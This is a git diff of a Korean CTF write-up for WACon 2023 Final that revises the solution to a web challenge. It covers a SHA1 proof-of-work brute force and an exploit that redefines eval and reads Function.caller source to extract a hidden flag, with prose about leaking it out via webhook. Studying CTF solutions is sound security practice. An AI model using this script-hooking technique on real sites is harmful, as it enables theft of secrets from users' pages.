@@ -1,6 +1,6 @@
 ---
 layout: post
-author: jun0911
+author: jun0911, me2nuk
 title: WACon 2023 Final CTF Writeup
 tags: [CTF]
 ---
@@ -189,7 +189,7 @@ exec("node /app/bot.js {$param}");
 
 Pow을 이용하여 검증을 한 다음에 입력한 header와 script가 그대로 ``"./data".sha1($SALT.$key)`` 파일에 저장합니다.
 
-그런 다음, ``랜덤 바이트 + 시간 + 랜덤 바이트`` sha1 encrypt 한 값을 node /app/bot.js에 파라미터로 넘겨줍니다.
+그런 다음, $key 변수에 ``random_bytes(32).time().random_bytes(32)``랜덤한 값을 sha1 encrypt 하고 node /app/bot.js에 파라미터로 넘겨줍니다.
 
 ```js
 const puppeteer = require('puppeteer');
@@ -451,7 +451,7 @@ function check_pow($input) {
 }
 ```
 
-해당 gen_pow 함수에서는 $nonce, $check 두개의 랜덤 값을 sha1 encrypt하여 $_SESSION["pow_answer"]에 넣어주는데, sha1은 이미 다른 값으로도 똑같은 해쉬를 만들어낼 수 있는 안전하지 않은 알고리즘이다.
+해당 gen_pow 함수에서는 $nonce, $check 두개의 랜덤 값을 sha1 encrypt하여 $_SESSION["pow_answer"]에 넣어주는데, sha1은 이미 다른 값으로도 똑같은 해쉬를 만들어낼 수 있는 안전하지 않은 알고리즘입니다.
 
 때문에 ``sha1($_SESSION["pow_nonce"]. $input)``이 $_SESSION["pow_answer"]와 똑같은 해쉬가 나올 수 있도록 무차별 대입을 진행하면 됩니다.
 
@@ -497,9 +497,9 @@ for brute in itertools.product(ascii, repeat=5):
 
 itertools.product 함수를 이용하여 nonce + check 해쉬가 일치할 때 까지 반복하여 찾아내면 됩니다.
 
-### Scenario
+## Scenario
 
-해당 챌린지의 공격 방법은 총 2 단계가 존재합니다.
+해당 챌린지의 Exploit 방법은 총 2 단계가 존재합니다.
 
 ```
 1. eval Function Hooking
@@ -508,38 +508,63 @@ itertools.product 함수를 이용하여 nonce + check 해쉬가 일치할 때 �
 
 ### 1. eval Function Hooking
 
-가장 간단하게 챌린지를 해결할 수 있는 방법입니다.
+eval 함수를 재정의하여 후킹을 통해 caller 으로 FLAG 값을 가져오는 방법입니다.
 
 ```php
-<div id="flag_container">
-    <script nonce="<?=$nonce?>">
-        window.setTimeout(() => {
-            let tester = 0, tmp = 0;
-            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>
+[ ... ]
+<html>
+    <head>
+        <div id="flag_container">
+            <script nonce="<?=$nonce?>">
+                window.setTimeout(() => {
+                    
+                    let tester = 0, tmp = 0;
+                    <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>
+                    
+                    // no winning race
+                    tmp = 0;
+                    for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
+                        tmp += 1;
 
-            ...
+                    // never pollute eval
+                    tester = 0;
+                    eval("tester = 1");
+                    if(tester === 0) {
+                        return;
+                    }
+                    
+                    // no winning race
+                    tmp = 0;
+                    for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
+                        tmp += 1;
 
-            // never pollute eval
-            tester = 0;
-            eval("tester = 1");
-            if(tester === 0) {
-                return;
-            }
+                    eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
+                    <?php } ?>
 
-            ...
+                }, 2000); // 2000ms delay
+            </script>
+        </div>
+    </head>
+    <body>
+        <script nonce="<?=$nonce?>">
+            (() => { 
+                let flag_container = document.getElementById("flag_container");
+                document.body.removeChild(flag_container);
+                window.setTimeout = window.setInterval = null;
+            })();
+        </script>
 
-            eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
-            <?php } ?>
-
-        }, 2000);
-    </script>
-</div>
+        <script nonce="<?=$nonce?>">
+            // User code goes here
+            <?= $script ?>
+        </script>
+    </body>
+</html>
 ```
 
-먼저, $script와 $header 값을 우리가 입력할 수 있고 $script 태그를 이용하여 JS 코드를 실행합니다.
+window.setTimeout에 $FLAG 길이만큼 반복하고 tester 변수를 체크 한 다음 eval 함수 안에 주석으로 $FLAG 값이 한 글자씩 들어가 있는 함수를 등록 합니다.
 
-하지만 window.setTimeout으로 인해 2000ms 정도 delay를 가진 다음 플래그 값이 포함된 eval 함수를 실행하게 됩니다.
-
+그리고 flag_container id를 가진 tag를 removeChild으로 삭제하고 제일 하단에 ``<?= $script ?>`` 으로 우리가 입력할 수 있는 $script 변수가 그대로 실행 됩니다.
 
 ```js
 eval = (data) => {
@@ -547,106 +572,65 @@ eval = (data) => {
 }
 ```
 
-그러면 window.setTimeout으로 인해 늦게 실행되고, 원하는 JS 코드를 실행 할 수 있다는 점을 이용하여 eval 함수를 재정의해서 Hooking을 진행하면 되는 것을 알 수 있습니다.
+먼저 $script 를 입력할 수 있다는 점을 이용하여 ``eval("///////// ~~ $FLAG[$i])``와 같이 호출 될 때 들어가는 인자를 탈취하기 위해 eval 함수를 후킹하면 됩니다.
 
-위와 같이 재정의를 하게 되면 eval 함수 안에 들어가는 값을 원하는대로 조작을 할 수 있게 됩니다.
 
-```php
-<div id="flag_container">
-    <script nonce="<?=$nonce?>">
-        window.setTimeout(() => {
-            let tester = 0, tmp = 0;
-            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>
+위 처럼 eval 함수를 재정의 하는 방법이 존재하지만, 아래와 같이 tester === 0 을 비교하여 
 
-            ...
+eval 함수가 제대로 잘 작동 하는지 검사하기 때문에 단순하게 탈취하기엔 어렵습니다.
 
-            // never pollute eval
-            tester = 0;
-            eval("tester = 1");
-            if(tester === 0) {
-                return;
-            }
-
-            ...
-
-        }, 2000);
-    </script>
-</div>
+```js
+// never pollute eval
+tester = 0;
+eval("tester = 1");
+if(tester === 0) {
+    return;
+}
 ```
 
-챌린지에서 tester = 0으로 설정하고 eval을 이용해 tester 값을 1로 변경합니다, 현재 eval을 재정의할 수 있는 방법은 아래의 코드에서 재정의할 수 있는데 여기서 tester 값을 1로 변경해려면 setTimeout 함수의 내부 스코프에 접근해야합니다.
+하지만 새로운 방법을 찾아보면 바로 Function.prototype.caller이 존재하는데, 
+
+.caller 을 사용한 함수가 호출 될 때 해당 함수를 호출한 상위 함수 코드를 전부 가져올 수 있습니다.
 
 ```php
-<script nonce="<?=$nonce?>">
-    // User code goes here
-    <?= $script ?>
+<script>
+
+  window.setTimeout(() => {
+      eval("2+2");
+
+      if(true){
+        // tester === 0와 비슷하게 1+1을 실행하지 못하도록 만듬
+        return;
+      }
+      // comments
+      eval("1+1"); // eval("////////// ~~ $FLAG"); 대체하여 1+1 실행
+      // 하지만 if(true){ return; }으로 인해 실행이 안 됨
+  }, 2000);
+
+</script>
+<script>
+
+  function func(data){
+      console.log(func.caller.toString());
+  }
+
+  eval = func
+
 </script>
 ```
 
-간단하게 eval("tester = 1")를 추가로 진행하도록 설정하게 된다면 eval이 실행되는 기본 스코프는 전역 스코프임으로, 
-setTimeout 함수 내부에 eval 함수를 호출하지 않는 이상 밖에서 tester의 값을 변경하게되면 전역스코프의 tester 변수의 값을 변경시킵니다.
+다음과 같은 코드를 실행하면 2000ms 정도 delay를 준 다음 eval 함수를 먼저 재정의 하고 if(true){} 으로 인해 ``eval("2+2");``만 실행하게 됩니다.
 
-그러면 지역 스코프의 tester 변수의 값이 변경되지 않음으로 if (tester === 0) 이라는 조건에 걸리게 됩니다.
+그렇다면 문제 파일과 비슷하게 ``tester === 0``하고 ``if(true){return;}``와 유사하게 eval("1+1")을 가져올 수 없게 됩니다.
 
-이와 같은 문제를 해결하기 위해서는 javascript의 caller/callee를 사용할 수 있습니다.
+하지만 ``func.caller.toString()``의 결과를 보면 아래와 같이 한번 ``eval("2+2")``이 실행 됐을 때 이미 해당 eval 함수를 실행했던 상위 함수의 모든 코드를 가져오는걸 볼 수 있습니다.
 
-caller를 사용하면 위의 문제를 해결할 수 있습니다. caller는 자신을 호출한 함수를 가리킵니다.
+![/images/posts/wacon-final-writeup/eval_hooking_example.png](eval_hooking_example.png) 
 
-그러면 eval 함수를 재정의하여 호출한 caller를 가져오고 해당 함수를 toString으로 변환하면 굳이 if (tester === 0) 조건을 통과할 필요 없이 현재 정의되어있는 함수의 코드를 가져올 수 있습니다.
 
-아래는 eval 함수를 재정의 하여 caller를 사용해 조건을 통과할 수 있는 예시입니다.
+그렇다면 func.caller.toString()을 이용한다면 tester === 0 조건을 무시하더라도 이미 tester = 1을 실행하는 eval과 FLAG가 담겨 있는 eval과 같은 함수 위치에 있기 때문에
 
-```js
-FLAG = "secretFlag";
-
-function test() {
-	tester = 0; 
-    
-    eval("tester = 1");
-    
-    if (tester === 0) { return; }
-    
-    // secret
-    for (let i = 0; i < FLAG.length; i++) {
-    	eval("// flag :" + FLAG[i]);
-    }
-}
-
-eval = (data) => {
-	console.log(data.caller.toString());
-}
-
-test();
-
-/*
--> result == function test() {
-	tester = 0; 
-    
-    eval("tester = 1");
-    
-    if (tester === 0) { return; }
-    
-    // secret
-    
-   eval("// flag :s");
-    eval("// flag :e");
-    eval("// flag :c");
-    eval("// flag :r");
-    eval("// flag :e");
-    eval("// flag :t");
-    eval("// flag :F");
-    eval("// flag :l");
-    eval("// flag :a");
-    eval("// flag :g");
-}
-*/
-```
-
-caller에는 호출한 함수의 원형이 담기므로 설정되어있는 flag를 Leak할 수 있습니다.
-
-그 이후 정규표현식을 이용해, flag 값만을 추출하여 공격자의 서버로 전달시키도록 Exploit payload를 작성할 수 있습니다.
-
-아래는 eval hooking을 진행하여 flag를 얻어내는 exploit 코드입니다.
+한 번 실행 될 떄 마다 tester = 1을 실행하게 한 상위 함수 코드를 가져와 FLAG를 추출하면 됩니다.
 
 ```js
 org_eval = eval;
@@ -658,13 +642,11 @@ function myFunc() {
     } else {
 
         let scripts = myFunc.caller.toString();
-
-        if(strings == "tester = 1"){
-            var tester = 1;
-        }
-
+        // myFunc를 호출한 상위 함수의 모든 코드를 가져와
+        
         let reg = new RegExp(/eval\(\"\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\$flag\[[0-9]+\] = (.+)\"\)/g);
-
+        // RegExp 정규 표현식으로 전체 코드에서 
+        // $flag 내용이 있는 eval 함수를 호출하는 코드를 추출
 
         const matches = scripts.matchAll(reg);
         let flags = "";
@@ -682,11 +664,9 @@ function myFunc() {
 eval = myFunc
 ```
 
-위 코드를 확인해보면 eval 함수를 재정의하고 있습니다, eval 함수를 호출한 caller를 가져와서 caller가 없으면 아무것도 실행하지 않고, caller가 존재한다면 scripts에 호출한 caller의 toString을 사용해 문자열을 가져옵니다.
+그러면 위와 같은 코드를 이용하여 최종적으로 페이로드가 완성 됩니다.
 
-그 이후 정규표현식을 이용해서 가져온 caller의 함수 문자열과 일치하는 부분을 가져옵니다.
-
-이를 FLAG의 길이만큼 반복하고 flags 변수에 저장하도록 합니다. flags 변수에 모두 값이 저장되었으면, webhook을 이용해 유출한 flags 값을 보낼 수 있습니다.
+RegExp를 이용해 eval 함수 중 $flag 내용이 담겨있는 문자열을 가져오고 location.href으로 해당 flag 값을 로그 남길 수 있게 됩니다.
 
 전체 Full Exploit 코드입니다.
 
